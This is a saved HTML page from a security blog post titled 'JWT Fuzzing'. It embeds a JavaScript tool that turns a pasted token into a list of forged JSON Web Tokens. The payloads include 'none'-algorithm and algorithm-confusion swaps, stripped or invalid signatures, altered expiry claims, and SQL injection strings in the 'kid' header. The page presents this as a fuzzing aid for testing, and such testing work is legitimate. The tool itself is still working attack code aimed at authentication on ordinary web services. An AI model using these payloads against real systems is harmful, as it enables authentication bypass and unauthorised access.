<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="JWT Fuzzing" /><meta property="og:locale" content="en_US" /><meta name="description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values." /><meta property="og:description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values." /><link rel="canonical" href="https://node-security.com/posts/jwt-fuzzing/" /><meta property="og:url" content="https://node-security.com/posts/jwt-fuzzing/" /><meta property="og:site_name" content="Node Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-25T18:03:38+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JWT Fuzzing" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="zCs6F-1y95azrfcOnbFvS60JAILGGXaeG4vY1-JFacs" /> <script type="application/ld+json"> {"url":"https://node-security.com/posts/jwt-fuzzing/","@type":"BlogPosting","headline":"JWT Fuzzing","dateModified":"2021-05-25T18:24:49+10:00","datePublished":"2021-05-25T18:03:38+10:00","description":"The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values.","mainEntityOfPage":{"@type":"WebPage","@id":"https://node-security.com/posts/jwt-fuzzing/"},"@context":"https://schema.org"}</script><title>JWT Fuzzing | Node Security</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-RCTP6RS6T4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-RCTP6RS6T4'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Node Security</a></div><div class="site-subtitle font-italic">Security & Programming Guides</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/O1dMate" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['o1dmate','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>JWT Fuzzing</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>JWT Fuzzing</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Alexander Wells </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, May 25, 2021, 6:03 PM +1000" prep="on" > May 25 <i class="unloaded">2021-05-25T18:03:38+10:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, May 25, 2021, 6:24 PM +1000" prefix="Updated " > May 25 <i class="unloaded">2021-05-25T18:24:49+10:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="156 words">1 min</span></div></div><div class="post-content"><p>The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values.</p><script> function generatePayloads(header, body, signature) { let payloads = []; let tempHeader = null; let currentTime = Math.floor(Date.now() / 1000); let tokenIAT = body.iat; let tokenEXP = body.exp; let tokenValidFor = tokenEXP-tokenIAT; /* 'none' Algorithm */ payloads.push(joinComponents({...header, alg: 'none'}, body, signature)); /* 'none' Algorithm & Remove Signature */ payloads.push(joinComponents({...header, alg: 'none'}, body, null)); /* Change Algorithms */ if (header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, signature)); if (header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, signature)); if (header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, signature)); if (header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, signature)); if (header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, signature)); if (header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, signature)); if (header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, signature)); if (header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, signature)); if (header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, signature)); if (header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, signature)); if (header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, signature)); if (header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, signature)); if (header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, signature)); /* Change Algorithms & Remove Signature */ if (header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, null)); if (header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, null)); if (header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, null)); if (header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, null)); if (header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, null)); if (header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, null)); if (header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, null)); if (header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, null)); if (header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, null)); if (header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, null)); if (header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, null)); if (header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, null)); if (header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, null)); /* Change 'kid' */ if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: ''}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '12345'}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: ''}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: ''}, body, null)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '12345'}, body, null)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: null}, body, null)); /* 'kid' Injection */ if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `'`}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '`'}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `';--`}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '`;--'}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' OR 1=1;--`}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '` OR 1=1;-'}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' UNION SELECT 'test';--`}, body, signature)); if (header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' UNION SELECT 'P@ssMord$9';--`}, body, signature)); /* Invalid Algorithm */ payloads.push(joinComponents({...header, alg: null}, body, signature)); payloads.push(joinComponents({...header, alg: ''}, body, signature)); payloads.push(joinComponents({...header, alg: 'JWS'}, body, signature)); payloads.push(joinComponents({...header, alg: 'JWE'}, body, signature)); payloads.push(joinComponents({...header, alg: []}, body, signature)); payloads.push(joinComponents({...header, alg: {}}, body, signature)); payloads.push(joinComponents({...header, alg: 0}, body, signature)); payloads.push(joinComponents({...header, alg: '\''}, body, signature)); payloads.push(joinComponents({...header, alg: '`'}, body, signature)); payloads.push(joinComponents({...header, alg: '%00'}, body, signature)); payloads.push(joinComponents({...header, alg: '\x00'}, body, signature)); /* Invalid Type */ payloads.push(joinComponents({...header, typ: null}, body, signature)); payloads.push(joinComponents({...header, typ: ''}, body, signature)); payloads.push(joinComponents({...header, typ: 'JWS'}, body, signature)); payloads.push(joinComponents({...header, typ: 'JWE'}, body, signature)); payloads.push(joinComponents({...header, typ: []}, body, signature)); payloads.push(joinComponents({...header, typ: {}}, body, signature)); payloads.push(joinComponents({...header, typ: 0}, body, signature)); payloads.push(joinComponents({...header, typ: '\''}, body, signature)); payloads.push(joinComponents({...header, typ: '`'}, body, signature)); payloads.push(joinComponents({...header, typ: '%00'}, body, signature)); payloads.push(joinComponents({...header, typ: '\x00'}, body, signature)); /* Invalid Signature */ payloads.push(joinComponents(header, body, 'a')); payloads.push(joinComponents(header, body, signature+'a')); /* Modify 'iat' & 'exp' */ payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1, exp: tokenEXP+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), exp: tokenEXP+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+tokenValidFor}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+3600}, signature)); /* Remove Algorithm */ tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.alg; payloads.push(joinComponents(tempHeader, body, signature)); payloads.push(joinComponents(tempHeader, body, null)); /* Remove Type */ tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.typ; payloads.push(joinComponents(tempHeader, body, signature)); /* Remove Signature */ payloads.push(joinComponents({...header}, body, null)); return payloads; } function joinComponents(header, body, signature) { let finalJWT = [btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '')]; if (signature) { finalJWT.push(signature); } return finalJWT.join('.'); } function getTimeDifference(dateObj) { /* Difference in seconds */ let difference = Math.abs(dateObj.getTime() - (new Date()).getTime()) / 1000.0; if (difference < 2) return `1 second`; if (difference < 60) return `${Math.floor(difference)} seconds`; /* Difference in minutes */ difference /= 60; if (difference < 2) return `1 minute`; if (difference < 60) return `${Math.floor(difference)} minutes`; /* Difference in hours */ difference /= 60; if (difference < 2) return `1 hour`; if (difference < 60) return `${Math.floor(difference)} hours`; /* Difference in days */ difference /= 24; if (difference < 2) return `1 day`; return `${Math.floor(difference)} days`; } function checkIfJwt(jwtString) { try { if (!jwtString) return 'empty'; let splitToken = jwtString.split('.'); let jwtHeader; let jwtBody; if (splitToken.length !== 3) return `JWT must contains 3 parts. Provided token contains ${splitToken.length} part${splitToken.length === 1 ? '' : 's'}`; try { atob(splitToken[0]) } catch (err) { return `JWT Header is not a valid base64 string` } try { atob(splitToken[1]) } catch (err) { return `JWT Body is not a valid base64 string` } try { jwtHeader = JSON.parse(atob(splitToken[0])) } catch (err) { return `JWT Header is not a valid Object` } try { jwtBody = JSON.parse(atob(splitToken[1])) } catch (err) { return `JWT Body is not a valid Object` } if (!Number.isInteger(jwtBody.iat)) return 'JWT Body `iat` value is not an integer'; if (!Number.isInteger(jwtBody.exp)) return 'JWT Body `exp` value is not an integer'; if (!splitToken[2]) return `JWT does not contain a Signature` if (!jwtHeader.hasOwnProperty('alg')) return 'JWT Header does not contain the `alg` key'; if (!jwtBody.hasOwnProperty('iat')) return 'JWT Body does not contain the `iat` key'; if (!jwtBody.hasOwnProperty('exp')) return 'JWT Body does not contain the `exp` key'; /* All checks passed */ return false; } catch (err) { console.log(err); return 'Processing of the JWT caused an unexpected error'; } }; function createPayloads() { let payload = document.getElementById('jwtPayload').value.trim(); let isIssuesWithJwt = checkIfJwt(payload); if (!isIssuesWithJwt) { let jwtObj = { header: JSON.parse(atob(payload.split('.')[0])), body: JSON.parse(atob(payload.split('.')[1])), signature: payload.split('.')[2] }; document.getElementById('mainBlock').style.display = 'block'; document.getElementById('errorsWithJwt').innerText = ``; document.getElementById('jwtHeader').innerText = JSON.stringify(jwtObj.header, null, 2); document.getElementById('jwtBody').innerText = JSON.stringify(jwtObj.body, null, 2); document.getElementById('jwtSignature').innerText = jwtObj.signature; /* Display the suggested payloads */ let suggestedPayloadsListContainer = document.getElementById('suggestedPayloads'); suggestedPayloadsListContainer.innerHTML = ''; let suggestPayloads = [ '\'none\' Algorithm', '\'none\' Algorithm & Remove Signature', 'Modify Algorithm (RS256 -> HS256, HS256 -> RS256, RS256 -> RS512, etc)', 'Modify Algorithm & Remove Signature', 'Invalid Algorithm', 'Invalid Type', 'Invalid Signature', 'Modify IssuedAt (\'iat\') & Expiration(\'exp\')', 'Remove Algorithm', 'Remove Type', 'Remove Signature', ]; if (jwtObj.header.hasOwnProperty('kid')) { suggestPayloads.push('Modify \'kid\''); suggestPayloads.push('\'kid\' SQL Injection'); } /* Add the suggested payloads to the unordered list */ suggestPayloads.forEach(suggestedPayload => { let childElement = document.createElement('li'); childElement.innerText = suggestedPayload; suggestedPayloadsListContainer.appendChild(childElement); }) /* Generate the JWT payloads */ let results = generatePayloads(jwtObj.header, jwtObj.body, jwtObj.signature); let payloadListContainer = document.getElementById('payloadList'); /* Clear the Unordered List */ payloadListContainer.innerHTML = ''; /* Add all the output payloads to the unordered list */ results.forEach(outputPayload => { /* Correct way instead of string concatenation. Because XSS is bad. */ let childElement = document.createElement('li'); childElement.innerText = outputPayload; payloadListContainer.appendChild(childElement); }); /* Update the field telling the user how many payloads there are */ document.getElementById('totalPayloads').innerText = `Total Payloads: ${results.length}`; /* Show the IssueAt time on-screen */ let iatTime = new Date(jwtObj.body.iat*1000); document.getElementById('jwtIssuedAt').innerText = `JWT was issued at ${(iatTime).toLocaleString()}`; document.getElementById('jwtSessionTime').innerText = `${jwtObj.body.exp - jwtObj.body.iat} seconds` let expTime = new Date(jwtObj.body.exp*1000); if (expTime > new Date()) { document.getElementById('jwtExpiresAt1').innerText = `valid`; document.getElementById('jwtExpiresAt1').style.color = `LawnGreen`; document.getElementById('jwtExpiresAt2').innerText = ` and expires at ${(expTime).toLocaleString()} (in ${getTimeDifference(expTime)})`; } else { document.getElementById('jwtExpiresAt1').innerText = `not valid`; document.getElementById('jwtExpiresAt1').style.color = `Red`; document.getElementById('jwtExpiresAt2').innerText = ` and expired at ${(expTime).toLocaleString()} (${getTimeDifference(expTime)} ago)`; } } else { if (isIssuesWithJwt === 'empty') { document.getElementById('errorsWithJwt').innerText = ``; } else { document.getElementById('errorsWithJwt').innerText = `ERROR: ${isIssuesWithJwt}`; } document.getElementById('jwtHeader').innerText = ''; document.getElementById('jwtBody').innerText = ''; document.getElementById('jwtSignature').innerText = ''; document.getElementById('jwtSessionTime').innerText = ``; document.getElementById('jwtIssuedAt').innerText = ``; document.getElementById('suggestedPayloads').innerHTML = ''; document.getElementById('payloadList').innerHTML = ''; document.getElementById('totalPayloads').innerText = `Total Payloads: 0`; document.getElementById('mainBlock').style.display = 'none'; } } function jwtTokenChanged() { try { let storeToken = window.sessionStorage.getItem('storeJwtToken') || null; /* Only temp store the token if the allowed */ if (storeToken === 'true') { let payload = document.getElementById('jwtPayload').value; window.sessionStorage.setItem('jwtPayload', (payload || '')); } createPayloads(); } catch (err) {} } function copyAllToClipboard(includedDecodedPayloads) { let tokensToCopy = []; /* Create a list of the payloads */ Object.values(document.getElementById('payloadList').children).forEach(child => { tokensToCopy.push(child.innerText); /* Decode the header and the body */ if (includedDecodedPayloads) { let splitPieces = child.innerText.split('.'); splitPieces[0] = atob(splitPieces[0]); splitPieces[1] = atob(splitPieces[1]); tokensToCopy.push(splitPieces.join('.')); } }) /* Get the text field */ let copyElement = document.createElement('textarea'); copyElement.value = tokensToCopy.join('\n'); copyElement.setAttribute('readonly', ''); document.body.appendChild(copyElement); /* Select the text field */ copyElement.select(); copyElement.setSelectionRange(0, 99999);/* For mobile devices */ /* Copy the text inside the text field */ document.execCommand("copy"); document.body.removeChild(copyElement); } /* Store the preference of whether to temp store the token or not */ function radioChange(newValue) { if (newValue) { window.sessionStorage.setItem('storeJwtToken', 'true'); jwtTokenChanged(); } else { window.sessionStorage.setItem('storeJwtToken', 'false'); window.sessionStorage.removeItem('jwtPayload'); } } </script><h1 id="warning">WARNING</h1><p>Be <strong>VERY</strong> careful when pasting JWT tokens into arbitrary websites! JWT’s can grant access to systems and must be treated as confidential.</p><p><strong>ALL</strong> processing on this website is done <strong>client-side</strong>. However, this may not be case with other sites.</p><p>The value in the input field below is stored in session storage for temporary persistance (refreshes and changing pages). This is cleared when your browser/tab is closed. If you don’t want tokens stored at all, update the option below:</p><p><input type="radio" id="storeJwtToken" name="storeJwtToken" onchange="radioChange(true)" /> <label for="storeJwtToken">Temp Store</label><br /> <input type="radio" id="doNotStoreJwtToken" name="storeJwtToken" onchange="radioChange(false)" /> <label for="doNotStoreJwtToken">Do not Temp Store</label></p><script> /* Get saved preference of whether to temp store the token */ let storeJwtToken = window.sessionStorage.getItem('storeJwtToken') || null; /* Set the initial state of whether to temp store the token or not */ if (storeJwtToken === 'true') document.getElementById('storeJwtToken').checked = true; else if (storeJwtToken === 'false') { document.getElementById('doNotStoreJwtToken').checked = true; window.sessionStorage.removeItem('jwtPayload'); } /* Default case */ else { document.getElementById('storeJwtToken').checked = true; window.sessionStorage.setItem('storeJwtToken', true); } </script><h1 id="insert-jwt">Insert JWT</h1><style> .inputField { width: 100%; color: #bfbfbf; background-color: #252525; border-block-color: #252525; resize: none; outline: none; border: none; border-radius: 6px; padding: 1rem; margin-right: 1rem; font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; } .buttonStyle { cursor: pointer; border-radius: 3px; border: none; color: #ddd; background-color: #0072B5; } .buttonStyle:hover { box-shadow: 0px 0px 15px 5px rgb(0, 114, 181); }</style><textarea id="jwtPayload" name="jwtPayload" placeholder="Paste JWT Token here ..." class="inputField" rows="4" oninput="jwtTokenChanged()"></textarea><h3 id="errorsWithJwt"></h3><div id="mainBlock"><h1>JWT Data</h1><h2>Header</h2><pre id="jwtHeader">
</pre><h2>Body</h2><pre id="jwtBody">
</pre><ul><li><span>Session length is <span id="jwtSessionTime"></span>.</span><br /><li><span id="jwtIssuedAt"></span><br /><li><span id="jwtExpiresAt">JWT is <span id="jwtExpiresAt1"></span><span id="jwtExpiresAt2"></span></span><br /></ul><h2>Signature</h2><pre id="jwtSignature">
</pre><h1>Payload List</h1><ul id="suggestedPayloads"></ul><button type="button" class="buttonStyle" onclick="copyAllToClipboard()">Copy Payloads to Clipboard</button> <button type="button" class="buttonStyle" onclick="copyAllToClipboard(true)">Copy Payloads &amp; DECODED Payloads to Clipboard</button><br /><br /><p id="totalPayloads"></p><ul id="payloadList"></ul></div><script> /* Check if there is a token in session storage */ let savedJwtTokenData = (window.sessionStorage.getItem('jwtPayload') || '').toString(); /* Update the text area with the value if there is a stored token */ if (savedJwtTokenData) { document.getElementById('jwtPayload').value = savedJwtTokenData; } createPayloads(); </script></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tools/'>tools</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tools/" class="post-tag no-text-decoration" >tools</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JWT Fuzzing - Node Security&url=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JWT Fuzzing - Node Security&u=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=JWT Fuzzing - Node Security&url=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/jwt-fuzzing/">JWT Fuzzing</a><li><a href="/posts/when-do-options-requests-get-sent/">When are OPTIONS Requests Sent?</a><li><a href="/posts/windows-uac-privilege-escalation/">Windows UAC Privilege Escalation</a><li><a href="/posts/configuring-ssh-server/">Configuring SSH Server</a><li><a href="/posts/creating-xlsx-documents-in-javascript-advanced/">Creating XLSX Documents in Javascript (Advanced)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/express/">express</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/when-do-options-requests-get-sent/"><div class="card-body"> <span class="timeago small" > May 15 <i class="unloaded">2021-05-15T10:41:50+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>When are OPTIONS Requests Sent?</h3><div class="text-muted small"><p> In this post we’ll look at OPTIONS requests, when they get sent, and their security implications. A basic understanding of CORS and CSRF attacks would be beneficial before reading this post. S...</p></div></div></a></div><div class="card"> <a href="/posts/using-wget/"><div class="card-body"> <span class="timeago small" > May 18 <i class="unloaded">2021-05-18T21:48:55+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Using Wget</h3><div class="text-muted small"><p> How to perform requests using wget and setup a http proxy for wget. API Call wget https://testing.com/login Ignore Cert Issues --no-check-certificate Add Headers --header 'Authorization: Basic ...</p></div></div></a></div><div class="card"> <a href="/posts/openssl-creating-a-host-certificate/"><div 